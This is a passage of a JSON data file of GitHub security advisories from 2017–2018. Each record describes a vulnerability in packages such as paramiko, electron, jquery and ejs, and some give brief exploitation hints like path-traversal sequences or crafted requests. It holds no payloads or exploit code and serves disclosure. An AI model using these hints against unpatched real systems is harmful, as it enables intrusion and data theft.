    "description": "webhooks/base.py in Anymail (aka django-anymail) before 1.2.1 is prone to a timing attack vulnerability on the WEBHOOK_AUTHORIZATION secret, which allows remote attackers to post arbitrary e-mail tracking events.",
    "summary": "Moderate severity vulnerability that affects django-anymail"
  },
  {
    "ghsaId": "GHSA-qc55-vm3j-74gp",
    "publishedAt": "2018-07-12T20:30:36Z",
    "description": "JSNAPy is an open source python version of Junos Snapshot Administrator developed by Juniper available through github. The default configuration and sample files of JSNAPy automation tool versions prior to 1.3.0 are created world writable. This insecure file and directory permission allows unprivileged local users to alter the files under this directory including inserting operations not intended by the package maintainer, system administrator, or other users. This issue only affects users who downloaded and installed JSNAPy from github.",
    "summary": "Low severity vulnerability that affects jsnapy"
  },
  {
    "ghsaId": "GHSA-3hq4-f2v6-q338",
    "publishedAt": "2018-07-12T20:30:30Z",
    "description": "Kotti before 1.3.2 and 2.x before 2.0.0b2 has CSRF in the local roles implementation, as demonstrated by triggering a permission change via a /admin-document/@@share request.",
    "summary": "Moderate severity vulnerability that affects Kotti"
  },
  {
    "ghsaId": "GHSA-6mww-xvh7-fq4f",
    "publishedAt": "2018-07-12T20:29:40Z",
    "description": "Koji version 1.12, 1.13, 1.14 and 1.15 contain an incorrect access control vulnerability resulting in arbitrary filesystem read/write access. This vulnerability has been fixed in versions 1.12.1, 1.13.1, 1.14.1 and 1.15.1.",
    "summary": "Moderate severity vulnerability that affects koji"
  },
  {
    "ghsaId": "GHSA-8jxq-75rw-fhj9",
    "publishedAt": "2018-07-12T20:29:35Z",
    "description": "io/mongo/parser.py in Eve (aka pyeve) before 0.7.5 allows remote attackers to execute arbitrary code via Code Injection in the where parameter.",
    "summary": "High severity vulnerability that affects eve"
  },
  {
    "ghsaId": "GHSA-232r-66cg-79px",
    "publishedAt": "2018-07-12T20:29:30Z",
    "description": "transport.py in the SSH server implementation of Paramiko before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5, 2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not properly check whether authentication is completed before processing other requests, as demonstrated by channel-open. A customized SSH client can simply skip the authentication step.",
    "summary": "High severity vulnerability that affects paramiko"
  },
  {
    "ghsaId": "GHSA-6528-wvf6-f6qg",
    "publishedAt": "2018-07-12T20:29:26Z",
    "description": "lib/Crypto/PublicKey/ElGamal.py in PyCrypto through 2.6.1 generates weak ElGamal key parameters, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for PyCrypto's ElGamal implementation.",
    "summary": "Moderate severity vulnerability that affects pycrypto"
  },
  {
    "ghsaId": "GHSA-p6h9-gw49-rqm4",
    "publishedAt": "2018-07-12T20:29:21Z",
    "description": "An issue was discovered in markdown2 (aka python-markdown2) through 2.3.5. The safe_mode feature, which is supposed to sanitize user input against XSS, is flawed and does not escape the input properly. With a crafted payload, XSS can be triggered, as demonstrated by omitting the final '>' character from an IMG tag.",
    "summary": "Moderate severity vulnerability that affects markdown2"
  },
  {
    "ghsaId": "GHSA-hxxf-q3w9-4xgw",
    "publishedAt": "2018-07-12T19:52:02Z",
    "description": "Version 3.7.2 of the popular package `eslint-scope` and version 5.0.2 were published without authorization ( see https://github.com/eslint/eslint-scope/issues/39 ). These versions contained apparently malicious code that attempted to steal npm login tokens. They have both been unpublished and are no longer available.\r\n\r\nnpm is aware of this issue and is providing updates on this issue at this page: https://status.npmjs.org/incidents/dn7c1fgrr7ng\r\n\r\n",
    "summary": "Critical severity vulnerability that affects eslint-config-eslint and eslint-scope"
  },
  {
    "ghsaId": "GHSA-w4vg-rf63-f3j3",
    "publishedAt": "2018-07-12T14:45:42Z",
    "description": "Pillow before 3.3.2 allows context-dependent attackers to execute arbitrary code by using the \"crafted image file\" approach, related to an \"Insecure Sign Extension\" issue affecting the ImagingNew in Storage.c component.",
    "summary": "Moderate severity vulnerability that affects Pillow"
  },
  {
    "ghsaId": "GHSA-p5wr-vp8g-q5p4",
    "publishedAt": "2018-07-12T14:45:15Z",
    "description": "Plone 4.x through 4.3.11 and 5.x through 5.0.6 allow remote attackers to bypass a sandbox protection mechanism and obtain sensitive information by leveraging the Python string format method.",
    "summary": "Moderate severity vulnerability that affects Plone"
  },
  {
    "ghsaId": "GHSA-6cwv-x26c-w2q4",
    "publishedAt": "2018-07-12T12:00:00Z",
    "description": "In Jupyter Notebook before 5.4.1, a maliciously forged notebook file can bypass sanitization to execute JavaScript in the notebook context. Specifically, invalid HTML is 'fixed' by jQuery after sanitization, making it dangerous.",
    "summary": "Low severity vulnerability that affects notebook"
  },
  {
    "ghsaId": "GHSA-pr3h-jjhj-573x",
    "publishedAt": "2018-06-20T22:18:58Z",
    "description": "Specially crafted requests can be used to access files that exist on the filesystem that is outside an application's root directory, when the Sprockets server is used in production.\r\n  \r\nAll users running an affected release should either upgrade or use one of the work arounds immediately.\r\n  \r\nWorkaround:\r\n  \r\nIn Rails applications, work around this issue, set `config.assets.compile = false` and `config.public_file_server.enabled = true` in an initializer and precompile the assets.\r\n\r\nThis work around will not be possible in all hosting environments and upgrading is advised.",
    "summary": "High severity vulnerability that affects sprockets"
  },
  {
    "ghsaId": "GHSA-qh2h-chj9-jffq",
    "publishedAt": "2018-06-08T12:43:43Z",
    "description": "Growl adds growl notification support to nodejs. Growl before 1.10.0 does not properly sanitize input before passing it to exec, allowing for arbitrary command execution.",
    "summary": "Critical severity vulnerability that affects growl"
  },
  {
    "ghsaId": "GHSA-vwrf-r5r4-7775",
    "publishedAt": "2018-06-07T19:43:25Z",
    "description": "Hapi versions less than 11.0.0 implement CORS incorrectly and allowed for configurations that at best returned inconsistent headers and at worst allowed cross-origin activities that were expected to be forbidden. If the connection has CORS enabled but one route has it off, and the route is not GET, the OPTIONS prefetch request will return the default CORS headers and then the actual request will go through and return no CORS headers. This defeats the purpose of turning CORS on the route.",
    "summary": "Moderate severity vulnerability that affects hapi"
  },
  {
    "ghsaId": "GHSA-39pj-gq8q-9pfj",
    "publishedAt": "2018-06-07T19:43:20Z",
    "description": "Due to a bug in the the default sign in functionality in the keystone node module before 0.3.16, incomplete email addresses could be matched. A correct password is still required to complete sign in.",
    "summary": "Moderate severity vulnerability that affects keystone"
  },
  {
    "ghsaId": "GHSA-rc8h-3fv6-pxv8",
    "publishedAt": "2018-06-07T19:43:15Z",
    "description": "Certain input passed into the If-Modified-Since or Last-Modified headers will cause an 'illegal access' exception to be raised. Instead of sending a HTTP 500 error back to the sender, hapi node module before 11.1.3 will continue to hold the socket open until timed out (default node timeout is 2 minutes).",
    "summary": "High severity vulnerability that affects hapi"
  },
  {
    "ghsaId": "GHSA-vwjc-q9px-r9vq",
    "publishedAt": "2018-06-07T19:43:11Z",
    "description": "Certain input strings when passed to new Date() or Date.parse() in ecstatic node module before 1.4.0 will cause v8 to raise an exception. This leads to a crash and denial of service in ecstatic when this input is passed into the server via the If-Modified-Since header.",
    "summary": "High severity vulnerability that affects ecstatic"
  },
  {
    "ghsaId": "GHSA-4662-j96g-mv46",
    "publishedAt": "2018-06-07T19:43:06Z",
    "description": "Arbitrary code execution is possible in reduce-css-calc node module <=1.2.4 through crafted css. This makes cross sites scripting (XSS) possible on the client and arbitrary code injection possible on the server and user input is passed to the `calc` function.",
    "summary": "Critical severity vulnerability that affects reduce-css-calc"
  },
  {
    "ghsaId": "GHSA-3pxp-6963-46r9",
    "publishedAt": "2018-06-07T19:43:00Z",
    "description": "The pdfinfojs NPM module versions <= 0.3.6 has a command injection vulnerability that allows an attacker to execute arbitrary commands on the victim's machine.",
    "summary": "High severity vulnerability that affects pdfinfojs"
  },
  {
    "ghsaId": "GHSA-mq35-wqvf-r23c",
    "publishedAt": "2018-06-05T21:32:06Z",
    "description": "Sinatra before 2.0.2 has XSS via the 400 Bad Request page that occurs upon a params parser exception.",
    "summary": "High severity vulnerability that affects sinatra"
  },
  {
    "ghsaId": "GHSA-gvpx-9459-w3mj",
    "publishedAt": "2018-05-23T20:37:46Z",
    "description": "Cross-site scripting (XSS) vulnerability in the Link package for CKEditor 5 before 10.0.1 allows remote attackers to inject arbitrary scripts through a specially crafted href attribute of a link (A) element.",
    "summary": "Low severity vulnerability that affects @ckeditor/ckeditor5-link"
  },
  {
    "ghsaId": "GHSA-px3r-jm9g-c8w8",
    "publishedAt": "2018-04-26T15:41:10Z",
    "description": "There is a possible XSS vulnerability in all rails-html-sanitizer gem versions below 1.0.4 for Ruby. The gem allows non-whitelisted attributes to be present in sanitized output when input with specially-crafted HTML fragments, and these attributes can lead to an XSS attack on target applications. This issue is similar to CVE-2018-8048 in Loofah. All users running an affected release should either upgrade or use one of the workarounds immediately.",
    "summary": "Moderate severity vulnerability that affects rails-html-sanitizer"
  },
  {
    "ghsaId": "GHSA-jp4x-w63m-7wgm",
    "publishedAt": "2018-04-26T15:25:17Z",
    "description": "hoek node module before 5.0.3 or 4.2.1 suffers from a Modification of Assumed-Immutable Data (MAID) vulnerability via 'merge' and 'applyToDefaults' functions, which allows a malicious user to modify the prototype of \"Object\" via __proto__, causing the addition or modification of an existing property that will exist on all objects.",
    "summary": "Moderate severity vulnerability that affects hoek"
  },
  {
    "ghsaId": "GHSA-vpch-rxw3-fgx8",
    "publishedAt": "2018-04-25T14:30:43Z",
    "description": "RisingStack protect version 1.2.0 and earlier contains a Cross Site Scripting (XSS) vulnerability in isXss() function in lib/rules/xss.js that can result in dangerous XSS strings being validated as safe. This attack appears to be exploitable via A number of XSS strings(26) detailed in the GitHub issue #16.",
    "summary": "Moderate severity vulnerability that affects @risingstack/protect"
  },
  {
    "ghsaId": "GHSA-882p-jqgm-f45g",
    "publishedAt": "2018-04-13T16:17:46Z",
    "description": "The xz_head function in xzlib.c in libxml2 before 2.9.6 allows remote attackers to cause a denial of service (memory consumption) via a crafted LZMA file, because the decoder functionality does not restrict memory usage to what is required for a legitimate file.",
    "summary": "Moderate severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-fjqr-fx3f-g4rv",
    "publishedAt": "2018-03-26T16:41:20Z",
    "description": "Github Electron version Electron 1.8.2-beta.4 and earlier contains a Command Injection vulnerability in Protocol Handler that can result in command execute. This attack appear to be exploitable via the victim opening an electron protocol handler in their browser. This vulnerability appears to have been fixed in Electron 1.8.2-beta.5. This issue is due to an incomplete fix for CVE-2018-1000006, specifically the black list used was not case insensitive allowing an attacker to potentially bypass it.",
    "summary": "Moderate severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-8xwg-wv7v-4vqp",
    "publishedAt": "2018-03-26T16:41:17Z",
    "description": "Electron version 1.7 up to 1.7.12; 1.8 up to 1.8.3 and 2.0.0 up to 2.0.0-beta.3 contains an improper handling of values vulnerability in Webviews that can result in remote code execution. This attack appear to be exploitable via an app which allows execution of 3rd party code AND disallows node integration AND has not specified if webview is enabled/disabled. This vulnerability appears to have been fixed in 1.7.13, 1.8.4, 2.0.0-beta.4.",
    "summary": "High severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-x7rv-cr6v-4vm4",
    "publishedAt": "2018-03-21T11:57:11Z",
    "description": "Loofah allows non-whitelisted attributes to be present in sanitized output when input with specially-crafted HTML fragments.\r\n\r\nUsers are affected if running Loofah < 2.2.1, but only:\r\n\r\n* when running on MRI or RBX,\r\n* in combination with libxml2 >= 2.9.2.\r\n\r\nPlease note: JRuby users are not affected.",
    "summary": "Moderate severity vulnerability that affects loofah"
  },
  {
    "ghsaId": "GHSA-7f42-p84j-f58p",
    "publishedAt": "2018-03-21T11:56:32Z",
    "description": "When Sanitize <= 4.6.2 is used in combination with libxml2 >= 2.9.2, a specially crafted HTML fragment can cause libxml2 to generate improperly escaped output, allowing non-whitelisted attributes to be used on whitelisted elements.\r\n\r\nThis can allow HTML and JavaScript injection, which could result in XSS if Sanitize's output is served to browsers.",
    "summary": "Moderate severity vulnerability that affects sanitize"
  },
  {
    "ghsaId": "GHSA-pcm6-g2qp-9gw8",
    "publishedAt": "2018-03-16T01:13:46Z",
    "description": "lib/cap-strap/helpers.rb in the cap-strap gem 0.1.5 for Ruby places credentials on the useradd command line, which allows local users to obtain sensitive information by listing the process.",
    "summary": "Low severity vulnerability that affects cap-strap"
  },
  {
    "ghsaId": "GHSA-hwhh-2fwm-cfgw",
    "publishedAt": "2018-03-13T20:44:48Z",
    "description": "Doorkeeper version 2.1.0 through 4.2.5 contains a Cross Site Scripting (XSS) vulnerability in web view's OAuth app form, user authorization prompt web view that can result in Stored XSS on the OAuth Client's name will cause users interacting with it will execute payload. This attack appear to be exploitable via The victim must be tricked to click an opaque link to the web view that runs the XSS payload. A malicious version virtually indistinguishable from a normal link.. This vulnerability appears to have been fixed in 4.2.6, 4.3.0.",
    "summary": "High severity vulnerability that affects doorkeeper"
  },
  {
    "ghsaId": "GHSA-7h42-5vj2-cq39",
    "publishedAt": "2018-03-13T20:42:00Z",
    "description": "brianleroux tiny-json-http version all versions since commit 9b8e74a232bba4701844e07bcba794173b0238a8 (Oct 29 2016) contains a Missing SSL certificate validation vulnerability in The libraries core functionality is affected. that can result in Exposes the user to man-in-the-middle attacks.",
    "summary": "High severity vulnerability that affects tiny-json-http"
  },
  {
    "ghsaId": "GHSA-82gw-pqf7-q3j2",
    "publishedAt": "2018-03-13T20:38:51Z",
    "description": "NPR Visuals Team Pym.js version versions 0.4.2 up to 1.3.1 contains a Cross Site Request Forgery (CSRF) vulnerability in Pym.js _onNavigateToMessage function. \r\n\r\nhttps://github.com/nprapps/pym.js/blob/master/src/pym.js#L573 that can result in Arbitrary javascript code execution. This attack appear to be exploitable via Attacker gains full javascript access to pages with Pym.js embeds when user visits an attacker crafted page.. This vulnerability appears to have been fixed in versions 1.3.2 and later.",
    "summary": "High severity vulnerability that affects pym.js"
  },
  {
    "ghsaId": "GHSA-6wpv-cj6x-v3jw",
    "publishedAt": "2018-03-13T16:15:57Z",
    "description": "The Ruby http gem before 0.7.3 does not verify hostnames in SSL connections, which might allow remote attackers to obtain sensitive information via a man-in-the-middle-attack.",
    "summary": "Moderate severity vulnerability that affects http"
  },
  {
    "ghsaId": "GHSA-wpq7-q8j4-72jg",
    "publishedAt": "2018-03-07T22:22:24Z",
    "description": "The Auth0.js library has a vulnerability affecting versions below 9.3 that allows an attacker to bypass the CSRF check from the state parameter if it's missing from the authorization response, leaving the client vulnerable to CSRF attacks.",
    "summary": "Moderate severity vulnerability that affects auth0-js"
  },
  {
    "ghsaId": "GHSA-688c-3x49-6rqj",
    "publishedAt": "2018-03-07T22:22:22Z",
    "description": "Sinatra rack-protection versions 1.5.4 and 2.0.0.rc3 and earlier contains a timing attack vulnerability in the CSRF token checking that can result in signatures can be exposed. This attack appear to be exploitable via network connectivity to the ruby application. This vulnerability appears to have been fixed in 1.5.5 and 2.0.0.",
    "summary": "Moderate severity vulnerability that affects rack-protection"
  },
  {
    "ghsaId": "GHSA-325j-24f4-qv5x",
    "publishedAt": "2018-03-07T22:22:20Z",
    "description": "index.js in the ssri module before 5.2.2 for Node.js is prone to a regular expression denial of service vulnerability in strict mode functionality via a long base64 hash string.",
    "summary": "Moderate severity vulnerability that affects ssri"
  },
  {
    "ghsaId": "GHSA-h6rj-8r3c-9gpj",
    "publishedAt": "2018-03-05T19:43:21Z",
    "description": "BSON injection vulnerability in the legal? function in BSON (bson-ruby) gem before 3.0.4 for Ruby allows remote attackers to cause a denial of service (resource consumption) or inject arbitrary data via a crafted string.",
    "summary": "Moderate severity vulnerability that affects bson"
  },
  {
    "ghsaId": "GHSA-pxr8-w3jq-rcwj",
    "publishedAt": "2018-03-05T19:37:23Z",
    "description": "An exploitable cross site scripting (XSS) vulnerability exists in the add filter functionality of the rails_admin rails gem version 1.2.0. A specially crafted URL can cause an XSS flaw resulting in an attacker being able to execute arbitrary javascript on the victim's browser. An attacker can phish an authenticated user to trigger this vulnerability.",
    "summary": "Moderate severity vulnerability that affects rails_admin"
  },
  {
    "ghsaId": "GHSA-8p2p-p8mg-x3cw",
    "publishedAt": "2018-03-05T19:33:54Z",
    "description": "Bitpay/insight-api Insight-api version 5.0.0 and earlier contains a CWE-20: input validation vulnerability in transaction broadcast endpoint that can result in Full Path Disclosure. This attack appear to be exploitable via Web request.",
    "summary": "Low severity vulnerability that affects insight-api"
  },
  {
    "ghsaId": "GHSA-vqcm-7f7f-r539",
    "publishedAt": "2018-03-05T19:32:06Z",
    "description": "lib/brbackup.rb in the brbackup gem 0.1.1 for Ruby places the database password on the mysql command line, which allows local users to obtain sensitive information by listing the process.",
    "summary": "Low severity vulnerability that affects brbackup"
  },
  {
    "ghsaId": "GHSA-6jqp-j69q-pm62",
    "publishedAt": "2018-03-05T19:16:56Z",
    "description": "index.js in the aws-lambda-multipart-parser NPM package before 0.1.2 has a Regular Expression Denial of Service (ReDoS) issue via a crafted multipart/form-data boundary string.",
    "summary": "Moderate severity vulnerability that affects aws-lambda-multipart-parser"
  },
  {
    "ghsaId": "GHSA-w7q9-xr2x-wh7x",
    "publishedAt": "2018-03-05T19:06:00Z",
    "description": "An exploitable cross site scripting (XSS) vulnerability exists in the filter functionality of the delayed_job_web rails gem version 1.4. A specially crafted URL can cause an XSS flaw resulting in an attacker being able to execute arbitrary javascript on the victim's browser. An attacker can phish an authenticated user to trigger this vulnerability.",
    "summary": "Moderate severity vulnerability that affects delayed_job_web"
  },
  {
    "ghsaId": "GHSA-6x77-rpqf-j6mw",
    "publishedAt": "2018-03-05T18:54:33Z",
    "description": "nodejs ejs version older than 2.5.5 is vulnerable to a denial-of-service due to weak input validation in the ejs.renderFile()",
    "summary": "High severity vulnerability that affects ejs"
  },
  {
    "ghsaId": "GHSA-446m-mv8f-q348",
    "publishedAt": "2018-03-05T18:35:09Z",
    "description": "The moment module before 2.19.3 for Node.js is prone to a regular expression denial of service via a crafted date string, a different vulnerability than CVE-2016-4055.",
    "summary": "Moderate severity vulnerability that affects moment"
  },
  {
    "ghsaId": "GHSA-wfwm-chj7-w59r",
    "publishedAt": "2018-03-05T18:29:32Z",
    "description": "In the Ox gem 2.8.1 for Ruby, the process crashes with a stack-based buffer over-read in the read_from_str function in sax_buf.c when a crafted input is supplied to sax_parse.",
    "summary": "Moderate severity vulnerability that affects ox"
  },
  {
    "ghsaId": "GHSA-h29f-7f56-j8wh",
    "publishedAt": "2018-02-20T19:23:20Z",
    "description": "An issue was discovered in rack-protection/lib/rack/protection/path_traversal.rb in Sinatra 2.x before 2.0.1 on Windows. Path traversal is possible via backslash characters.",
    "summary": "Moderate severity vulnerability that affects sinatra"
  },
  {
    "ghsaId": "GHSA-832h-xg76-4gv6",
    "publishedAt": "2018-01-29T15:50:46Z",
    "description": "index.js in brace-expansion before 1.1.7 is vulnerable to Regular Expression Denial of Service (ReDoS) attacks, as demonstrated by an expand argument containing many comma characters.",
    "summary": "Moderate severity vulnerability that affects brace-expansion"
  },
  {
    "ghsaId": "GHSA-9pr6-grf4-x2fr",
    "publishedAt": "2018-01-29T15:45:28Z",
    "description": "In strategy.rb in OmniAuth before 1.3.2, the authenticity_token value is improperly protected because POST (in addition to GET) parameters are stored in the session and become available in the environment of the callback phase.",
    "summary": "Moderate severity vulnerability that affects omniauth"
  },
  {
    "ghsaId": "GHSA-m34x-wgrh-g897",
    "publishedAt": "2018-01-24T19:38:52Z",
    "description": "ZEIT Next.js 4 before 4.2.3 has Directory Traversal under the /_next request namespace.",
    "summary": "High severity vulnerability that affects next"
  },
  {
    "ghsaId": "GHSA-94cq-7ccq-cmcm",
    "publishedAt": "2018-01-24T17:10:45Z",
    "description": "The lynx gem 0.2.0 for Ruby places the configured password on command lines, which allows local users to obtain sensitive information by listing processes.",
    "summary": "Low severity vulnerability that affects lynx"
  },
  {
    "ghsaId": "GHSA-w222-53c6-c86p",
    "publishedAt": "2018-01-23T03:57:44Z",
    "description": "A remote code execution vulnerability has been discovered which affects Electron apps that use custom protocol handlers. This vulnerability affects Microsoft Windows. Linux and macOS are not affected.",
    "summary": "Critical severity vulnerability that affects electron"
  },
  {
    "ghsaId": "GHSA-rhgq-vv9x-j4p5",
    "publishedAt": "2018-01-22T23:45:33Z",
    "description": "The login function in lib/lawn.rb in the lawn-login gem 0.0.7 for Ruby places credentials on the curl command line, which allows local users to obtain sensitive information by listing the process.",
    "summary": "Low severity vulnerability that affects lawn-login"
  },
  {
    "ghsaId": "GHSA-6x45-86q6-rcmr",
    "publishedAt": "2018-01-22T23:17:39Z",
    "description": "lib/gyazo/client.rb in the gyazo gem 1.0.0 for Ruby allows local users to write to arbitrary files via a symlink attack on a temporary file, related to time-based filenames.",
    "summary": "Low severity vulnerability that affects gyazo"
  },
  {
    "ghsaId": "GHSA-mhpp-875w-9cpv",
    "publishedAt": "2018-01-22T13:32:42Z",
    "description": "jQuery before 3.0.0 is vulnerable to Denial of Service (DoS) due to removing a logic that lowercased attribute names. Any attribute getter using a mixed-cased name for boolean attributes goes into an infinite recursion, exceeding the stack call limit.",
    "summary": "Moderate severity vulnerability that affects jquery"
  },
  {
    "ghsaId": "GHSA-rmxg-73gg-4p98",
    "publishedAt": "2018-01-22T13:32:06Z",
    "description": "jQuery before 3.0.0 is vulnerable to Cross-site Scripting (XSS) attacks when a cross-domain Ajax request is performed without the dataType option, causing text/javascript responses to be executed.",
    "summary": "Moderate severity vulnerability that affects jquery"
  },
  {
    "ghsaId": "GHSA-5jcf-c5rg-rmm8",
    "publishedAt": "2018-01-22T13:31:34Z",
    "description": "Paperclip ruby gem version 3.1.4 and later suffers from a Server-SIde Request Forgery (SSRF) vulnerability in the Paperclip::UriAdapter class. Attackers may be able to access information about internal network resources.",
    "summary": "High severity vulnerability that affects paperclip"
  },
  {
    "ghsaId": "GHSA-mvw8-v767-qhjm",
    "publishedAt": "2018-01-06T01:11:52Z",
    "description": "Radiant CMS 1.1.4 has XSS via crafted Markdown input in the part_body_content parameter to an admin/pages/*/edit resource.",
    "summary": "Moderate severity vulnerability that affects radiant"
  },
  {
    "ghsaId": "GHSA-m7p8-9w66-9frm",
    "publishedAt": "2018-01-06T01:11:34Z",
    "description": "The Net::LDAP (aka net-ldap) gem before 0.16.0 for Ruby has Missing SSL Certificate Validation.",
    "summary": "Moderate severity vulnerability that affects net-ldap"
  },
  {
    "ghsaId": "GHSA-7px7-7xjx-hxm8",
    "publishedAt": "2018-01-04T21:04:19Z",
    "description": "marked version 0.3.6 and earlier is vulnerable to an XSS attack in the data: URI parser.",
    "summary": "Moderate severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-crmx-v835-hcp4",
    "publishedAt": "2018-01-04T21:04:09Z",
    "description": "A Regular expression Denial of Service (ReDoS) vulnerability in the file marked.js of the marked npm package (tested on version 0.3.7) allows a remote attacker to overload and crash a server by passing a maliciously crafted string.",
    "summary": "Moderate severity vulnerability that affects marked"
  },
  {
    "ghsaId": "GHSA-8jjf-w7j6-323c",
    "publishedAt": "2018-01-04T21:03:33Z",
    "description": "An XML Signature Wrapping vulnerability exists in Samlify 2.2.0 and earlier, and in predecessor Express-saml2 which could allow attackers to impersonate arbitrary users.",
    "summary": "High severity vulnerability that affects samlify"
  },
  {
    "ghsaId": "GHSA-pm9p-9926-w68m",
    "publishedAt": "2017-12-28T22:52:47Z",
    "description": "A regular expression Denial of Service (DoS) vulnerability in the file lib/ecstatic.js of the ecstatic npm package, before version 2.0.0, allows a remote attacker to overload and crash a server by passing a maliciously crafted string.",
    "summary": "High severity vulnerability that affects ecstatic"
  },
  {
    "ghsaId": "GHSA-h9mj-fghc-664w",
    "publishedAt": "2017-12-28T22:51:58Z",
    "description": "MQTT.js 2.x.x prior to 2.15.0 issue in handling PUBLISH tickets may lead to an attacker causing a denial-of-service condition.",
    "summary": "Moderate severity vulnerability that affects mqtt"
  },
  {
    "ghsaId": "GHSA-7fpw-cfc4-3p2c",
    "publishedAt": "2017-12-28T22:51:45Z",
    "description": "A vulnerability has been discovered in the Auth0 passport-wsfed-saml2 library affecting versions < 3.0.5. This vulnerability allows an attacker to impersonate another user and potentially elevate their privileges if the SAML identity provider does not sign the full SAML response (e.g., only signs the assertion within the response).",
    "summary": "High severity vulnerability that affects passport-wsfed-saml2"
  },
  {
    "ghsaId": "GHSA-gj4p-3wh3-2rmf",
    "publishedAt": "2017-12-21T00:47:25Z",
    "description": "lib/yard/core_ext/file.rb in the server in YARD before 0.9.11 does not block relative paths with an initial ../ sequence, which allows attackers to conduct directory traversal attacks and read arbitrary files.",
    "summary": "High severity vulnerability that affects yard"
  },
  {
    "ghsaId": "GHSA-3rpr-mg43-xhq4",
    "publishedAt": "2017-12-21T00:47:20Z",
    "description": "A cross-origin vulnerability has been discovered in the Auth0 auth0.js library affecting versions &lt; 8.12. This vulnerability allows an attacker to acquire authenticated users' tokens and invoke services on a user's behalf if the target site or application uses a popup callback page with auth0.popup.callback().",
    "summary": "High severity vulnerability that affects auth0-js"
  },
  {
    "ghsaId": "GHSA-pv8x-p9hq-j328",
    "publishedAt": "2017-12-18T22:27:53Z",
    "description": "math.js before 3.17.0 had an issue where private properties such as a constructor could be replaced by using unicode characters when creating an object.",
    "summary": "High severity vulnerability that affects mathjs"
  },
  {
    "ghsaId": "GHSA-vx5c-87qx-cv6c",
    "publishedAt": "2017-12-18T22:27:45Z",
    "description": "math.js before 3.17.0 had an arbitrary code execution in the JavaScript engine. Creating a typed function with JavaScript code in the name could result arbitrary execution.",
    "summary": "High severity vulnerability that affects mathjs"
  },
  {
    "ghsaId": "GHSA-8c56-cpmw-89x7",
    "publishedAt": "2017-12-13T21:38:24Z",
    "description": "libxml2 20904-GITv2.9.4-16-g0741801 is vulnerable to a heap-based buffer over-read in the xmlDictAddString function in dict.c. This vulnerability causes programs that use libxml2, such as PHP, to crash. This vulnerability exists because of an incomplete fix for CVE-2016-1839.  GitHub is notifying on nokogiri as uses libxml2.",
    "summary": "Critical severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-x27v-x225-gq8g",
    "publishedAt": "2017-12-06T16:43:00Z",
    "description": "The Recurly Client Ruby Library before 2.0.13, 2.1.11, 2.2.5, 2.3.10, 2.4.11, 2.5.4, 2.6.3, 2.7.8, 2.8.2, 2.9.2, 2.10.4, 2.11.3 is vulnerable to a Server-Side Request Forgery vulnerability in the \"Resource#find\" method that could result in compromise of API keys or other critical resources.",
    "summary": "High severity vulnerability that affects recurly"
  },
  {
    "ghsaId": "GHSA-2w67-526p-gm73",
    "publishedAt": "2017-12-06T16:41:25Z",
    "description": "Redis-store <=v1.3.0 allows unsafe objects to be loaded from redis",
    "summary": "High severity vulnerability that affects redis-store"
  },
  {
    "ghsaId": "GHSA-3f5c-4qxj-vmpf",
    "publishedAt": "2017-12-05T02:04:14Z",
    "description": "ZEIT Next.js before 2.4.1 has directory traversal under the /_next and /static request namespace, allowing attackers to obtain sensitive information.",
    "summary": "High severity vulnerability that affects next"
  },
  {
    "ghsaId": "GHSA-3w5v-p54c-f74x",
    "publishedAt": "2017-11-30T23:15:19Z",
    "description": "nodejs ejs versions older than 2.5.3 is vulnerable to remote code execution due to weak input validation in ejs.renderFile() function",
    "summary": "High severity vulnerability that affects ejs"
  },
  {
    "ghsaId": "GHSA-hwcf-pp87-7x6p",
    "publishedAt": "2017-11-30T23:15:05Z",
    "description": "nodejs ejs version older than 2.5.5 is vulnerable to a Cross-site-scripting in the ejs.renderFile() resulting in code injection",
    "summary": "Moderate severity vulnerability that affects ejs"
  },
  {
    "ghsaId": "GHSA-3v3c-r5v2-68ph",
    "publishedAt": "2017-11-30T23:14:55Z",
    "description": "The private_address_check ruby gem before 0.4.1 is vulnerable to a bypass due to an incomplete blacklist of common private/local network addresses used to prevent server-side request forgery.",
    "summary": "High severity vulnerability that affects private_address_check"
  },
  {
    "ghsaId": "GHSA-q43c-g2g7-6gxj",
    "publishedAt": "2017-11-30T23:14:47Z",
    "description": "KeystoneJS before 4.0.0-beta.7 allows application-wide CSRF bypass by removing the CSRF parameter and value, aka SecureLayer7 issue number SL7_KEYJS_03. In other words, it fails to reject requests that lack an x-csrf-token header.",
    "summary": "High severity vulnerability that affects keystone"
  },
  {
    "ghsaId": "GHSA-hxhj-hp9m-qwc4",
    "publishedAt": "2017-11-29T23:21:05Z",
    "description": "The private_address_check ruby gem before 0.4.0 is vulnerable to a bypass due to use of Ruby's Resolv.getaddresses method, which is OS-dependent and should not be relied upon for security measures, such as when used to blacklist private network addresses to prevent server-side request forgery.",
    "summary": "Moderate severity vulnerability that affects private_address_check"
  },
  {
    "ghsaId": "GHSA-653m-r33x-39ff",
    "publishedAt": "2017-11-29T23:20:14Z",
    "description": "Stored cross-site scripting (XSS) vulnerability in \"geminabox\" (Gem in a Box) before 0.13.10 allows attackers to inject arbitrary web script via the \"homepage\" value of a \".gemspec\" file, related to views/gem.erb and views/index.erb.",
    "summary": "Moderate severity vulnerability that affects geminabox"
  },
  {
    "ghsaId": "GHSA-x7p2-x2j6-mwhr",
    "publishedAt": "2017-11-29T23:19:51Z",
    "description": "Stored cross-site scripting (XSS) vulnerability in Gemirro before 0.16.0 allows attackers to inject arbitrary web script via a crafted javascript: URL in the \"homepage\" value of a \".gemspec\" file.",
    "summary": "Moderate severity vulnerability that affects gemirro"
  },
  {
    "ghsaId": "GHSA-5c8j-xr24-2665",
    "publishedAt": "2017-11-28T22:44:52Z",
    "description": "The printDirect function in lib/printer.js in the node-printer module 0.0.1 and earlier for Node.js allows remote attackers to execute arbitrary commands via unspecified characters in the lpr command.",
    "summary": "High severity vulnerability that affects printer"
  },
  {
    "ghsaId": "GHSA-wwh7-4jw9-33x6",
    "publishedAt": "2017-11-28T22:44:42Z",
